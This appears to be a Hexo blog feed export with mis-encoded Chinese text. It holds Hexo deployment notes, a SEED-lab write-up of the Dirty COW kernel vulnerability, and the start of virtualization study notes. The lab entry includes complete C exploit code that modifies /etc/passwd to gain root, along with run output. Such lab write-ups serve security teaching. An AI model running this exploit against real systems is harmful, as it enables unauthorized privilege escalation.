preview</li><li>æ›´æ”¹å›¾ç‰‡ç›®å½•ä¸º../image</li><li>åœ¨hexo/sourceç›®å½•æ‰“å¼€vscodeï¼Œä¸å¯ä»¥åœ¨_postç›®å½•æ‰“å¼€vscodeï¼Œå¦åˆ™æ— æ³•æ˜¾ç¤ºå›¾ç‰‡</li></ul><h1 id="å†™æ–‡ç« åŸåˆ™"><a href="#å†™æ–‡ç« åŸåˆ™" class="headerlink" title="å†™æ–‡ç« åŸåˆ™"></a>å†™æ–‡ç« åŸåˆ™</h1><ul><li>å¤šæ–‡å­—ã€å°‘å›¾</li><li>ç”¨ASCIIæ›¿ä»£å›¾<ul><li><a href="https://asciiflow.com/">https://asciiflow.com/</a></li><li><a href="https://textik.com/">https://textik.com/</a></li></ul></li></ul><h1 id="è¸©åˆ°çš„å‘"><a href="#è¸©åˆ°çš„å‘" class="headerlink" title="è¸©åˆ°çš„å‘"></a>è¸©åˆ°çš„å‘</h1><ul><li>æŠ¥é”™ï¼š<code>fatal: not a git repository (or any of the parent directories): .git</code>ã€‚è§£å†³æ–¹æ¡ˆï¼šåˆ é™¤hexoç›®å½•ä¸‹çš„.deploy_gitæ–‡ä»¶å¤¹</li><li>mdæ–‡ä»¶å¼€å¤´çš„å‡ ä¸ªé€‰é¡¹ï¼Œæ¯”å¦‚<code>tags:</code>åé¢è¦ç•™ä¸€ä¸ªç©ºæ ¼æ‰å¯ä»¥æ­£ç¡®è§£æï¼Œä¸ç„¶ä¼šå¯¼è‡´æ— æ³•éƒ¨ç½²</li><li>å‡ºç°å¦‚ä¸‹æŠ¥é”™ï¼š<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">kex_exchange_identification: Connection closed by remote host<br>Connection closed by <span class="hljs-number">20.205</span><span class="hljs-number">.243</span><span class="hljs-number">.166</span> port <span class="hljs-number">22</span><br>fatal: Could <span class="hljs-keyword">not</span> read from remote repository.<br>Please make sure you have the correct access rights<br><span class="hljs-keyword">and</span> the repository exists.<br><br>FATAL &#123;<br>  err: Error: Spawn failed<br>      at ChildProcess.&lt;anonymous&gt; (C:\Hexo\node_modules\hexo-util\lib\spawn.js:<span class="hljs-number">51</span>:<span class="hljs-number">21</span>)<br>      at ChildProcess.emit (node:events:<span class="hljs-number">390</span>:<span class="hljs-number">28</span>)<br>      at ChildProcess.cp.emit (C:\Hexo\node_modules\cross-spawn\lib\enoent.js:<span class="hljs-number">34</span>:<span class="hljs-number">29</span>)<br>      at Process.ChildProcess._handle.onexit (node:internal/child_process:<span class="hljs-number">290</span>:<span class="hljs-number">12</span>) &#123;<br>    code: <span class="hljs-number">128</span><br>  &#125;<br>&#125; Something<span class="hljs-number">&#x27;</span>s wrong. Maybe you can find the solution here: %s https:<span class="hljs-comment">//hexo.io/docs/troubleshooting.html</span><br></code></pre></td></tr></table></figure><ul><li>è§£å†³ï¼šåœ¨<code>~/.ssh/config</code>ä¸­å¦‚ä¸‹é…ç½®ï¼š<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">Host github.com<br>Hostname ssh.github.com<br>IdentityFile <span class="hljs-string">&quot;C:\Users\GuoJiaming\.ssh\wdnmd&quot;</span><br>Port <span class="hljs-number">443</span><br></code></pre></td></tr></table></figure><h1 id="å¯¼èˆªæ é¢œè‰²"><a href="#å¯¼èˆªæ é¢œè‰²" class="headerlink" title="å¯¼èˆªæ é¢œè‰²"></a>å¯¼èˆªæ é¢œè‰²</h1></li></ul></li></ul><p> navbar_bg_color: â€œ#153b6eâ€</p><h1 id="åšå®¢ç•™è¨€æ¿"><a href="#åšå®¢ç•™è¨€æ¿" class="headerlink" title="åšå®¢ç•™è¨€æ¿"></a>åšå®¢ç•™è¨€æ¿</h1><p>//todo</p><h1 id="ä¸€äº›å‚è€ƒ"><a href="#ä¸€äº›å‚è€ƒ" class="headerlink" title="ä¸€äº›å‚è€ƒ"></a>ä¸€äº›å‚è€ƒ</h1><p><a href="https://bbs.huaweicloud.com/blogs/226867">https://bbs.huaweicloud.com/blogs/226867</a><br><a href="https://emoryhuang.cn/blog/1729600336.html">https://emoryhuang.cn/blog/1729600336.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SEED-labï¼šDirty Cow</title>
    <link href="/p/495b96e/"/>
    <url>/p/495b96e/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="è„ç‰›æ¼æ´ä»‹ç»"><a href="#è„ç‰›æ¼æ´ä»‹ç»" class="headerlink" title="è„ç‰›æ¼æ´ä»‹ç»"></a>è„ç‰›æ¼æ´ä»‹ç»</h1><blockquote><p>è„ç‰›ï¼Œä¹Ÿå³dirty COWï¼ˆcopy on writeï¼‰</p></blockquote><p>Dirty COW æ¼æ´å±äºç«æ€æ¡ä»¶æ¼æ´ï¼Œè‡ª2007å¹´9æœˆä»¥æ¥ä¸€ç›´å­˜åœ¨äº Linux å†…æ ¸ä¸­ï¼Œå¹¶äº2016å¹´10æœˆè¢«å‘ç°ï¼Œè¯¥æ¼æ´å½±å“æ‰€æœ‰åŸºäº Linux çš„æ“ä½œç³»ç»Ÿï¼ŒåŒ…æ‹¬ Androidï¼Œå…¶åæœéå¸¸ä¸¥é‡: æ”»å‡»è€…å¯ä»¥é€šè¿‡åˆ©ç”¨è¯¥æ¼æ´è·å¾—rootç‰¹æƒ</p><p>è¯¥æ¼æ´å­˜åœ¨äº Linux å†…æ ¸ä¸­çš„å†™æ—¶æ‹·è´ä»£ç ä¸­ã€‚é€šè¿‡åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥ä¿®æ”¹ä»»ä½•å—ä¿æŠ¤çš„æ–‡ä»¶ï¼Œå³ä½¿è¿™äº›æ–‡ä»¶åªå¯¹ä»–ä»¬å¯è¯»</p><h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><h1 id="æ”»å‡»dummy-file"><a href="#æ”»å‡»dummy-file" class="headerlink" title="æ”»å‡»dummy file"></a>æ”»å‡»dummy file</h1><p>åˆ›å»ºdummy fileï¼Œå¹¶å†™å…¥å†…å®¹111111222222333333</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo touch /zzz<br>sudo chmod 644 /zzz<br>sudo gedit /zzz<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬çš„ç›®æ ‡æ˜¯å°†â€œ222222â€æ›¿æ¢ä¸ºâ€œ * * * * * *â€</p><p>æ”»å‡»ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-keyword">void</span> *<span class="hljs-built_in">map</span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">writeThread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">madviseThread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">pthread_t</span> pth1,pth2;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br>  <span class="hljs-keyword">int</span> file_size;<br><br>  <span class="hljs-comment">// Open the target file in the read-only mode.</span><br>  <span class="hljs-keyword">int</span> f=open(<span class="hljs-string">&quot;/zzz&quot;</span>, O_RDONLY);<br><br>  <span class="hljs-comment">// Map the file to COW memory using MAP_PRIVATE.</span><br>  fstat(f, &amp;st);<br>  file_size = st.st_size;<br>  <span class="hljs-built_in">map</span>=mmap(<span class="hljs-literal">NULL</span>, file_size, PROT_READ, MAP_PRIVATE, f, <span class="hljs-number">0</span>);<br><br>  <span class="hljs-comment">// Find the position of the target area</span><br>  <span class="hljs-keyword">char</span> *position = <span class="hljs-built_in">strstr</span>(<span class="hljs-built_in">map</span>, <span class="hljs-string">&quot;222222&quot;</span>);                        <br><br>  <span class="hljs-comment">// We have to do the attack using two threads.</span><br>  pthread_create(&amp;pth1, <span class="hljs-literal">NULL</span>, madviseThread, (<span class="hljs-keyword">void</span>  *)file_size); <br>  pthread_create(&amp;pth2, <span class="hljs-literal">NULL</span>, writeThread, position);             <br><br>  <span class="hljs-comment">// Wait for the threads to finish.</span><br>  pthread_join(pth1, <span class="hljs-literal">NULL</span>);<br>  pthread_join(pth2, <span class="hljs-literal">NULL</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">writeThread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> *content= <span class="hljs-string">&quot;******&quot;</span>;<br>  <span class="hljs-keyword">off_t</span> offset = (<span class="hljs-keyword">off_t</span>) arg;<br><br>  <span class="hljs-keyword">int</span> f=open(<span class="hljs-string">&quot;/proc/self/mem&quot;</span>, O_RDWR);<br>  <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-comment">// Move the file pointer to the corresponding position.</span><br>    lseek(f, offset, SEEK_SET);<br>    <span class="hljs-comment">// Write to the memory.</span><br>    write(f, content, <span class="hljs-built_in">strlen</span>(content));<br>  &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">madviseThread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> file_size = (<span class="hljs-keyword">int</span>) arg;<br>  <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>      madvise(<span class="hljs-built_in">map</span>, file_size, MADV_DONTNEED);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç®€è¦åˆ†æä¸€ä¸‹ä¸Šé¢çš„ä»£ç é€»è¾‘ï¼š</p><ul><li></li></ul><p>ç¼–è¯‘å¹¶è¿è¡Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gcc cow_attack.c -lpthread</span><br><span class="hljs-meta">$</span><span class="bash"> a.out</span><br><span class="hljs-meta">$</span><span class="bash"> cat /zzz</span><br>111111******333333<br></code></pre></td></tr></table></figure><p>å‘ç°æ–‡ä»¶å†…å®¹å·²ç»è¢«æ›´æ”¹</p><h1 id="æ”»å‡»-etc-passwd-ä»¥è·å¾—ç‰¹æƒ"><a href="#æ”»å‡»-etc-passwd-ä»¥è·å¾—ç‰¹æƒ" class="headerlink" title="æ”»å‡»/etc/passwd ä»¥è·å¾—ç‰¹æƒ"></a>æ”»å‡»/etc/passwd ä»¥è·å¾—ç‰¹æƒ</h1><p><code>/etc/passwd</code>æ–‡ä»¶åŒ…å«ä¸ƒä¸ªå†’å·åˆ†éš”çš„å­—æ®µï¼Œç¬¬ä¸‰ä¸ªå­—æ®µæŒ‡å®šåˆ†é…ç»™ç”¨æˆ·çš„(UID)å€¼ï¼Œä»»ä½•UIDä¸º0çš„ç”¨æˆ·éƒ½è¢«ç³»ç»Ÿè§†ä¸º root ç”¨æˆ·ï¼Œæ­¤é˜¶æ®µæˆ‘ä»¬çš„ä»»åŠ¡æ˜¯åˆ©ç”¨è„ç‰›æ¼æ´æ¥å®ç°ææƒï¼Œä¹Ÿå³æ˜¯å°†ç¬¬ä¸‰ä¸ªå­—æ®µä»1001æ”¹ä¸º0000</p><p>å¢åŠ Charlieç”¨æˆ·</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo adduser charlie</span><br><span class="hljs-meta">$</span><span class="bash"> cat /etc/passwd | grep charlie</span><br>charlie:x:1001:1002:,,,:/home/charlie:/bin/bash<br></code></pre></td></tr></table></figure><p>æ”»å‡»ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-keyword">void</span> *<span class="hljs-built_in">map</span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">writeThread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">madviseThread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">pthread_t</span> pth1,pth2;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br>  <span class="hljs-keyword">int</span> file_size;<br><br>  <span class="hljs-comment">// Open the target file in the read-only mode.</span><br>  <span class="hljs-keyword">int</span> f=open(<span class="hljs-string">&quot;/etc/passwd&quot;</span>, O_RDONLY);<br><br>  <span class="hljs-comment">// Map the file to COW memory using MAP_PRIVATE.</span><br>  fstat(f, &amp;st);<br>  file_size = st.st_size;<br>  <span class="hljs-built_in">map</span>=mmap(<span class="hljs-literal">NULL</span>, file_size, PROT_READ, MAP_PRIVATE, f, <span class="hljs-number">0</span>);<br><br>  <span class="hljs-comment">// Find the position of the target area</span><br>  <span class="hljs-keyword">char</span> *position = <span class="hljs-built_in">strstr</span>(<span class="hljs-built_in">map</span>, <span class="hljs-string">&quot;1001:1002&quot;</span>);                        <br><br>  <span class="hljs-comment">// We have to do the attack using two threads.</span><br>  pthread_create(&amp;pth1, <span class="hljs-literal">NULL</span>, madviseThread, (<span class="hljs-keyword">void</span>  *)file_size); <br>  pthread_create(&amp;pth2, <span class="hljs-literal">NULL</span>, writeThread, position);             <br><br>  <span class="hljs-comment">// Wait for the threads to finish.</span><br>  pthread_join(pth1, <span class="hljs-literal">NULL</span>);<br>  pthread_join(pth2, <span class="hljs-literal">NULL</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">writeThread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> *content= <span class="hljs-string">&quot;0000:1002&quot;</span>;<br>  <span class="hljs-keyword">off_t</span> offset = (<span class="hljs-keyword">off_t</span>) arg;<br><br>  <span class="hljs-keyword">int</span> f=open(<span class="hljs-string">&quot;/proc/self/mem&quot;</span>, O_RDWR);<br>  <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-comment">// Move the file pointer to the corresponding position.</span><br>    lseek(f, offset, SEEK_SET);<br>    <span class="hljs-comment">// Write to the memory.</span><br>    write(f, content, <span class="hljs-built_in">strlen</span>(content));<br>  &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">madviseThread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> file_size = (<span class="hljs-keyword">int</span>) arg;<br>  <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>      madvise(<span class="hljs-built_in">map</span>, file_size, MADV_DONTNEED);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¼–è¯‘ã€è¿è¡Œ</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs haxe">$gcc <span class="hljs-keyword">new</span><span class="hljs-type">_cow</span>.c -lpthread -o <span class="hljs-keyword">new</span><span class="hljs-type"></span><br>$./<span class="hljs-keyword">new</span><span class="hljs-type"></span><br></code></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬å¯ä»¥æŸ¥çœ‹/etc/passwdæ–‡ä»¶ä¸­å…³äºCharlieçš„ä¸œè¥¿ï¼š</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">charlie:</span><span class="hljs-symbol">x:</span>0000<span class="hljs-symbol">:</span><span class="hljs-number">1002</span><span class="hljs-symbol">:</span>,,,<span class="hljs-symbol">:/home/charlie</span><span class="hljs-symbol">:/bin/bash</span><br></code></pre></td></tr></table></figure><p>ç¬¬ä¸‰ä¸ªæ¡ç›®å·²ç»æˆåŠŸä¿®æ”¹ä¸ºäº†0000</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># id</span><br><span class="hljs-attribute">uid</span>=0(root) <span class="hljs-attribute">gid</span>=1002(charlie) <span class="hljs-attribute">groups</span>=0(root),1002(charlie)<br></code></pre></td></tr></table></figure><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c">https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hardware and Software Support for Virtualization å­¦ä¹ ç¬”è®°</title>
    <link href="/p/12488d05/"/>
    <url>/p/12488d05/</url>
    
    <content type="html"><![CDATA[<h1 id="1-å®šä¹‰"><a href="#1-å®šä¹‰" class="headerlink" title="1 å®šä¹‰"></a>1 å®šä¹‰</h1><p>æœ¬ç« ä»‹ç»äº†è™šæ‹ŸåŒ–ã€è™šæ‹Ÿæœºå’Œè™šæ‹Ÿæœºç›‘è§†å™¨çš„åŸºæœ¬æ¦‚å¿µï¼Œå› ä¸ºå„ç§æ–‡ç« ã€æ•™ç§‘ä¹¦å’Œå•†ä¸šäº§å“æè¿°æœ‰æ—¶ä¼šä½¿ç”¨ç›¸äº’å†²çªçš„å®šä¹‰ã€‚</p><ul><li>è™šæ‹ŸåŒ–æ˜¯é€šè¿‡å¼ºåˆ¶æ¨¡å—åŒ–åº”ç”¨åˆ†å±‚åŸåˆ™ï¼Œå³å…¬å¼€çš„è™šæ‹Ÿèµ„æºä¸è¢«è™šæ‹ŸåŒ–çš„åº•å±‚ç‰©ç†èµ„æºç›¸åŒã€‚</li><li>è™šæ‹Ÿæœºæ˜¯ä¸€ä¸ªå®Œæ•´çš„è®¡ç®—ç¯å¢ƒçš„æŠ½è±¡ï¼Œé€šè¿‡å¯¹è®¡ç®—æœºçš„å¤„ç†å™¨ã€å†…å­˜å’Œ I/O ç»„ä»¶è¿›è¡Œç»„åˆè™šæ‹ŸåŒ–ã€‚</li><li>hypervisor æ˜¯ä¸€ä¸ªç®¡ç†å’Œè¿è¡Œè™šæ‹Ÿæœºçš„ä¸“ç”¨ç³»ç»Ÿè½¯ä»¶ã€‚</li><li>è™šæ‹Ÿæœºç›‘è§†å™¨(VMM)æ˜¯æŒ‡ç®¡ç†ç¨‹åºä¸­ä¸“æ³¨äº CPU å’Œå†…å­˜è™šæ‹ŸåŒ–çš„éƒ¨åˆ†ã€‚</li></ul><h2 id="1-1-è™šæ‹ŸåŒ–ï¼ˆvirtualizationï¼‰"><a href="#1-1-è™šæ‹ŸåŒ–ï¼ˆvirtualizationï¼‰" class="headerlink" title="1.1 è™šæ‹ŸåŒ–ï¼ˆvirtualizationï¼‰"></a>1.1 è™šæ‹ŸåŒ–ï¼ˆvirtualizationï¼‰</h2><p>å®šä¹‰æ˜¯ä»¥è®¡ç®—æœºç³»ç»Ÿçš„ä¸¤ä¸ªåŸºæœ¬åŸç†ä¸ºåŸºç¡€çš„ã€‚</p><p>é¦–å…ˆï¼Œåˆ†å±‚æ˜¯å•ä¸ªæŠ½è±¡çš„è¡¨ç¤ºï¼Œé€šè¿‡æ·»åŠ ä¸€ä¸ªé—´æ¥å±‚æ¥å®ç°ï¼Œå½“(i)é—´æ¥ä¾èµ–äºå•ä¸ªè¾ƒä½å±‚å’Œ(ii)ä½¿ç”¨å®šä¹‰è‰¯å¥½çš„åç§°ç©ºé—´æ¥å…¬å¼€æŠ½è±¡æ—¶ã€‚å…¶æ¬¡ï¼Œå¼ºåˆ¶çš„æ¨¡å—åŒ–è¿˜ä¿è¯äº†å±‚çš„å®¢æˆ·ç«¯ä¸èƒ½ç»•è¿‡æŠ½è±¡å±‚ï¼Œä¾‹å¦‚ç›´æ¥è®¿é—®ç‰©ç†èµ„æºæˆ–å¯¹åº•å±‚ç‰©ç†åç§°ç©ºé—´çš„ä½¿ç”¨å…·æœ‰å¯è§æ€§ã€‚å› æ­¤ï¼Œè™šæ‹ŸåŒ–åªä¸è¿‡æ˜¯ä¸€ä¸ªåˆ†å±‚å®ä¾‹ï¼Œå…¶å…¬å¼€çš„æŠ½è±¡ä¸åº•å±‚ç‰©ç†èµ„æºç­‰ä»·ã€‚æ˜¯é—´æ¥æ€§ã€å¼ºåˆ¶æ¨¡å—åŒ–å’Œå…¼å®¹æ€§çš„ç»“åˆï¼Œæ˜¯é™ä½è®¡ç®—æœºç³»ç»Ÿå¤æ‚æ€§å’Œç®€åŒ–æ“ä½œçš„ç‰¹åˆ«å¼ºå¤§çš„æ–¹æ³•ã€‚</p><p>ä»¥ RAID çš„ç»å…¸ç¤ºä¾‹ä¸ºä¾‹ã€‚RAIDæ˜¯ä¸€ç§ç£ç›˜é˜µåˆ—æŠ€æœ¯ï¼Œå°†å¤šä¸ªå»‰ä»·çš„ç‰©ç†ç¡¬ç›˜ç»„åˆæˆä¸€ä¸ªè™šæ‹Ÿç£ç›˜ï¼Œæä¾›å†—ä½™å’Œæ€§èƒ½å¢å¼ºçš„å­˜å‚¨è§£å†³æ–¹æ¡ˆã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œè™šæ‹ŸåŒ–çš„æ€æƒ³æ˜¯å°†å¤šä¸ªç‰©ç†ç¡¬ç›˜æŠ½è±¡ä¸ºä¸€ä¸ªå•ä¸€çš„è™šæ‹Ÿç£ç›˜ï¼Œä½¿æ–‡ä»¶ç³»ç»Ÿå¯ä»¥åƒè®¿é—®å•ä¸ªç¡¬ç›˜ä¸€æ ·è®¿é—®è¿™ä¸ªè™šæ‹Ÿç£ç›˜ã€‚</p><ol><li><strong>RAIDç¤ºä¾‹</strong>ï¼šRAIDæ˜¯ä¸€ç§å…¸å‹çš„è™šæ‹ŸåŒ–æŠ€æœ¯ç¤ºä¾‹ã€‚å®ƒå°†å¤šä¸ªç‰©ç†ç¡¬ç›˜ç»„åˆåœ¨ä¸€èµ·ï¼Œä»¥æä¾›æ€§èƒ½å’Œå†—ä½™ã€‚è™šæ‹ŸåŒ–çš„æ¦‚å¿µåœ¨è¿™é‡Œä½“ç°åœ¨å°†å¤šä¸ªç¡¬ç›˜æŠ½è±¡ä¸ºä¸€ä¸ªè™šæ‹Ÿç£ç›˜ï¼Œå› æ­¤æ–‡ä»¶ç³»ç»Ÿä¸éœ€è¦çŸ¥é“å®ƒä»¬æ˜¯ç‰©ç†ç¡¬ç›˜ã€‚</li><li><strong>æ¥å£çš„å…¼å®¹æ€§</strong>ï¼šè™šæ‹Ÿç£ç›˜å’Œç‰©ç†ç¡¬ç›˜éƒ½éµå¾ªç›¸åŒçš„å—è®¾å¤‡æ¥å£ï¼Œè¿™æ„å‘³ç€æ–‡ä»¶ç³»ç»Ÿå¯ä»¥ä»¥ç›¸åŒçš„æ–¹å¼ä¸å®ƒä»¬è¿›è¡Œäº¤äº’ã€‚è¿™ç§å…¼å®¹æ€§ä½¿å¾—æ— è®ºRAIDå±‚æ˜¯å¦å­˜åœ¨ï¼Œæ–‡ä»¶ç³»ç»Ÿçš„éƒ¨ç½²æ–¹å¼éƒ½å¯ä»¥ä¿æŒä¸å˜ã€‚</li><li><strong>ç‰©ç†åœ°å€çš„éšè—</strong>ï¼šRAIDå±‚åœ¨å†…éƒ¨ç®¡ç†ç£ç›˜èµ„æºï¼Œéšè—äº†ç‰©ç†åœ°å€çš„ç»†èŠ‚ã€‚è¿™æ„å‘³ç€æ–‡ä»¶ç³»ç»Ÿå¯ä»¥é€æ˜åœ°å°†æ•°æ®å­˜å‚¨åœ¨è™šæ‹Ÿç£ç›˜ä¸Šï¼Œæ— 